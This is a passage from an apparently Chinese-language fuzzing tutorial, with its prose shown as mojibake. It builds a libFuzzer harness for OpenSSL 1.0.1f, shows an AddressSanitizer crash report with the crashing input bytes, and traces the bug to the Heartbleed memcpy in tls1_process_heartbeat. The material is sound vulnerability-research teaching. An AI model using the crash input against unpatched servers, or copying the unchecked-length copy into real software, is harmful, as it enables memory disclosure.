SSL_load_error_strings();</span><br><span class="line">  ERR_load_BIO_strings();</span><br><span class="line">  OpenSSL_add_all_algorithms();</span><br><span class="line">  SSL_CTX *sctx;</span><br><span class="line">  assert (sctx = SSL_CTX_new(TLSv1_method()));</span><br><span class="line">  <span class="comment">/* These two file were created with this command:</span></span><br><span class="line"><span class="comment">      openssl req -x509 -newkey rsa:512 -keyout server.key \</span></span><br><span class="line"><span class="comment">     -out server.pem -days 9999 -nodes -subj /CN=a/</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  assert(SSL_CTX_use_certificate_file(sctx, CERT_PATH <span class="string">&quot;server.pem&quot;</span>,</span><br><span class="line">                                      SSL_FILETYPE_PEM));</span><br><span class="line">  assert(SSL_CTX_use_PrivateKey_file(sctx, CERT_PATH <span class="string">&quot;server.key&quot;</span>,</span><br><span class="line">                                     SSL_FILETYPE_PEM));</span><br><span class="line">  <span class="keyword">return</span> sctx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size)</span> &#123;</span><br><span class="line">  <span class="type">static</span> SSL_CTX *sctx = Init();</span><br><span class="line">  SSL *server = SSL_new(sctx);</span><br><span class="line">  BIO *sinbio = BIO_new(BIO_s_mem());</span><br><span class="line">  BIO *soutbio = BIO_new(BIO_s_mem());</span><br><span class="line">  SSL_set_bio(server, sinbio, soutbio);</span><br><span class="line">  SSL_set_accept_state(server);</span><br><span class="line">  BIO_write(sinbio, Data, Size);</span><br><span class="line">  SSL_do_handshake(server);</span><br><span class="line">  SSL_free(server);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ¶‰åŠåˆ°opensslåº“æä¾›çš„ç›¸å…³æ–¹æ³•äº†ï¼Œæœ¬ç¯‡ä¸»è¦è®²è§£fuzzç›¸å…³ï¼Œå°±ä¸ç»†è®²openssläº†ã€‚æ€»ä¹‹å°±æ˜¯è¦å…ˆææ¸…æ¥šopensslçš„ç”¨æ³•ï¼Œå†é€šè¿‡include opensslæä¾›çš„å‡½æ•°æ¥å¯¹opensslè¿›è¡Œfuzzã€‚ç¼–è¯‘å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address,fuzzer \</span><br><span class="line">    -I openssl1.0.1f/include openssl1.0.1f/libssl.a openssl1.0.1f/libcrypto.a \</span><br><span class="line">    ../../libFuzzer/Fuzz/libFuzzer.a -o openssl_fuzzer</span><br></pre></td></tr></table></figure><p>-IæŒ‡å®šinlcudeçš„æœç´¢è·¯å¾„ï¼ŒåŒæ—¶é“¾æ¥é™æ€åº“libcrypto.aå’ŒlibFuzzer.aä»¥ä½¿ç”¨åº“ä¸­çš„å‡½æ•°ã€‚</p><p>è¿è¡Œè·‘å‡ºcrash:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">24646</span>REDUCE cov: <span class="number">611</span> ft: <span class="number">889</span> corp: <span class="number">50</span>/<span class="number">1105</span>b lim: <span class="number">116</span> exec/s: <span class="number">24646</span> rss: <span class="number">382</span>Mb L: <span class="number">64</span>/<span class="number">77</span> MS: <span class="number">5</span> InsertRepeatedBytes-PersAutoDict-InsertByte-ShuffleBytes-ChangeBit- DE: <span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\x04&quot;</span>-</span><br><span class="line">#<span class="number">25193</span>REDUCE cov: <span class="number">611</span> ft: <span class="number">889</span> corp: <span class="number">50</span>/<span class="number">1097</span>b lim: <span class="number">116</span> exec/s: <span class="number">25193</span> rss: <span class="number">382</span>Mb L: <span class="number">61</span>/<span class="number">77</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">2133</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x629000009748</span> at pc <span class="number">0x00000051eaba</span> bp <span class="number">0x7ffd255dae50</span> sp <span class="number">0x7ffd255da618</span></span><br><span class="line">READ of size <span class="number">21050</span> at <span class="number">0x629000009748</span> thread T0</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x51eab9</span> in __asan_memcpy /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:<span class="number">22</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x55e323</span> in tls1_process_heartbeat /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/t1_lib.c:<span class="number">2586</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x5cb97d</span> in ssl3_read_bytes /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_pkt.c:<span class="number">1092</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x5cff83</span> in ssl3_get_message /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_both.c:<span class="number">457</span>:<span class="number">7</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x59ac86</span> in ssl3_get_client_hello /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_srvr.c:<span class="number">941</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x596ac1</span> in ssl3_accept /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_srvr.c:<span class="number">357</span>:<span class="number">9</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x5518ad</span> in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl_fuzzer.cc:<span class="number">39</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x459a01</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">553</span>:<span class="number">15</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x459245</span> in fuzzer::Fuzzer::RunOne(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>, fuzzer::InputInfo*, <span class="type">bool</span>*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">469</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">9</span> <span class="number">0x45b4e7</span> in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">695</span>:<span class="number">19</span></span><br><span class="line">    #<span class="number">10</span> <span class="number">0x45c205</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">831</span>:<span class="number">5</span></span><br><span class="line">    #<span class="number">11</span> <span class="number">0x449fc8</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">825</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">12</span> <span class="number">0x473432</span> in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span>:<span class="number">10</span></span><br><span class="line">    #<span class="number">13</span> <span class="number">0x7f40a3932bf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line">    #<span class="number">14</span> <span class="number">0x41e159</span> in _start (/home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl_fuzzer2+<span class="number">0x41e159</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x629000009748</span> is located <span class="number">0</span> bytes to the right of <span class="number">17736</span>-<span class="type">byte</span> region [<span class="number">0x629000005200</span>,<span class="number">0x629000009748</span>)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x51f67d</span> in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:<span class="number">145</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x60091b</span> in CRYPTO_malloc /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/crypto/mem.c:<span class="number">308</span>:<span class="number">8</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x5d1737</span> in freelist_extract /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_both.c:<span class="number">708</span>:<span class="number">12</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x5d1737</span> in ssl3_setup_read_buffer /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_both.c:<span class="number">770</span>:<span class="number">10</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x5d1d4c</span> in ssl3_setup_buffers /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_both.c:<span class="number">827</span>:<span class="number">7</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x597703</span> in ssl3_accept /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_srvr.c:<span class="number">292</span>:<span class="number">9</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x5518ad</span> in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl_fuzzer.cc:<span class="number">39</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x459a01</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">553</span>:<span class="number">15</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x45b8a5</span> in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">740</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">9</span> <span class="number">0x45be79</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">793</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">10</span> <span class="number">0x449fc8</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">825</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">11</span> <span class="number">0x473432</span> in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span>:<span class="number">10</span></span><br><span class="line">    #<span class="number">12</span> <span class="number">0x7f40a3932bf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:<span class="number">22</span>:<span class="number">3</span> in __asan_memcpy</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c527fff9290</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c527fff92a0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c527fff92b0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c527fff92c0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c527fff92d0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">=&gt;<span class="number">0x0c527fff92e0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>[fa]fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c527fff92f0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c527fff9300</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c527fff9310</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c527fff9320</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c527fff9330</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow <span class="type">byte</span> legend (one shadow <span class="type">byte</span> represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">2133</span>==ABORTING</span><br><span class="line">MS: <span class="number">2</span> ChangeBinInt-InsertByte-; base unit: <span class="number">7</span>bfa057a7ae6a7bc6ea487749407e4e7d4e9bf84</span><br><span class="line"><span class="number">0x15</span>,<span class="number">0x3</span>,<span class="number">0xd4</span>,<span class="number">0x0</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x3a</span>,<span class="number">0x1</span>,<span class="number">0x3a</span>,<span class="number">0x1</span>,<span class="number">0xd3</span>,<span class="number">0xb3</span>,<span class="number">0x18</span>,<span class="number">0x3</span>,<span class="number">0xd4</span>,<span class="number">0x0</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x52</span>,<span class="number">0x3a</span>,<span class="number">0x1</span>,<span class="number">0x3a</span>,<span class="number">0x9</span>,<span class="number">0xd3</span>,<span class="number">0xb3</span>,<span class="number">0x18</span>,<span class="number">0x2c</span>,<span class="number">0x0</span>,<span class="number">0x7</span>,<span class="number">0x2</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x3a</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,</span><br><span class="line">\x15\x03\xd4\x00\x07\x01:\x01:\x01\xd3\xb3\x18\x03\xd4\x00\x07\x01R:\x01:\x09\xd3\xb3\x18,\x00\x07\x02\x07\x01:\x01\x00</span><br><span class="line">artifact_prefix=<span class="string">&#x27;./&#x27;</span>; Test unit written to ./crash<span class="number">-4</span>bfb53055de3fed318590b20ddd4cda0d95e8ed8</span><br><span class="line">Base64: FQPUAAcBOgE6AdOzGAPUAAcBUjoBOgnTsxgsAAcCBwE6AQA=</span><br></pre></td></tr></table></figure><p>é€šè¿‡SUMMARYå®¹æ˜“æ‰¾åˆ°é€ æˆheap_overflowçš„æ¼æ´ç‚¹åœ¨äº:<code>/local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:22:3 in __asan_memcpy</code>è¿™ç§ç›®å½•ä¸€çœ‹å°±æ˜¯å¾ˆåº•å±‚çš„ç›®å½•ï¼Œä¸æ˜“å®šä½ã€‚å†å¾€æ‰¾ä¸€å±‚:<code>#1 0x55e323 in tls1_process_heartbeat /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/t1_lib.c:2586:3</code>è¿™å°±å¾ˆå®¹æ˜“å®šä½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ¼æ´æº¯æºäº†ã€‚<br>å®šä½åˆ°äº†ä»£ç :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">tls1_process_heartbeat(SSL *s)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p = &amp;s-&gt;s3-&gt;rrec.data[<span class="number">0</span>], *pl;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> hbtype;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> payload;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> padding = <span class="number">16</span>; <span class="comment">/* Use minimum padding */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read type and payload length first */</span></span><br><span class="line">hbtype = *p++;</span><br><span class="line">n2s(p, payload);</span><br><span class="line">pl = p;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;msg_callback)</span><br><span class="line">s-&gt;msg_callback(<span class="number">0</span>, s-&gt;version, TLS1_RT_HEARTBEAT,</span><br><span class="line">&amp;s-&gt;s3-&gt;rrec.data[<span class="number">0</span>], s-&gt;s3-&gt;rrec.length,</span><br><span class="line">s, s-&gt;msg_callback_arg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hbtype == TLS1_HB_REQUEST)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *buffer, *bp;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate memory for the response, size is 1 bytes</span></span><br><span class="line"><span class="comment"> * message type, plus 2 bytes payload length, plus</span></span><br><span class="line"><span class="comment"> * payload, plus padding</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">buffer = OPENSSL_malloc(<span class="number">1</span> + <span class="number">2</span> + payload + padding);</span><br><span class="line">bp = buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Enter response type, length and copy payload */</span></span><br><span class="line">*bp++ = TLS1_HB_RESPONSE;</span><br><span class="line">s2n(payload, bp);</span><br><span class="line"><span class="built_in">memcpy</span>(bp, pl, payload);   <span class="comment">//æ¼æ´ç‚¹</span></span><br><span class="line">bp += payload;</span><br><span class="line"><span class="comment">/* Random padding */</span></span><br><span class="line">RAND_pseudo_bytes(bp, padding);</span><br><span class="line"></span><br><span class="line">r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, <span class="number">3</span> + payload + padding);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (r &gt;= <span class="number">0</span> &amp;&amp; s-&gt;msg_callback)</span><br><span class="line">s-&gt;msg_callback(<span class="number">1</span>, s-&gt;version, TLS1_RT_HEARTBEAT,</span><br><span class="line">buffer, <span class="number">3</span> + payload + padding,</span><br><span class="line">s, s-&gt;msg_callback_arg);</span><br><span class="line"></span><br><span class="line">OPENSSL_free(buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (hbtype == TLS1_HB_RESPONSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> seq;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We only send sequence numbers (2 bytes unsigned int),</span></span><br><span class="line"><span class="comment"> * and 16 random bytes, so we just try to read the</span></span><br><span class="line"><span class="comment"> * sequence number */</span></span><br><span class="line">n2s(pl, seq);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (payload == <span class="number">18</span> &amp;&amp; seq == s-&gt;tlsext_hb_seq)</span><br><span class="line">&#123;</span><br><span class="line">s-&gt;tlsext_hb_seq++;</span><br><span class="line">s-&gt;tlsext_hb_pending = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹å†<code>memcpy(bp, pl, payload);</code>æ ¹æ®crashåŸå› ä¸ºover_flowè¯´æ˜payloadçš„é•¿åº¦æœ‰é—®é¢˜ã€‚å¾€ä¸Šåˆ†æå‘ç°payloadæ˜¯é€šè¿‡n2så‡½æ•°ä»pæŒ‡å‘çš„ç»“æ„ä½“ï¼ˆç”¨æˆ·æ•°æ®åŒ…ï¼‰å†…å®¹å¾—åˆ°çš„ã€‚è¯¥ç»“æ„ä½“ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ssl3_record_st</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">int</span> type;               / type of record /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> length;    / How many bytes available /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> off;       / read/write offset into <span class="string">&#x27;buf&#x27;</span> /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> data;    / pointer to the record data /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> input;   / where the decode bytes are /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> comp;    / only used with decompression - <span class="built_in">malloc</span>()ed /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> epoch;    / epoch number, needed by DTLS1 /</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> seq_num[<span class="number">8</span>]; / sequence number, needed by DTLS1 /</span><br><span class="line">    &#125; 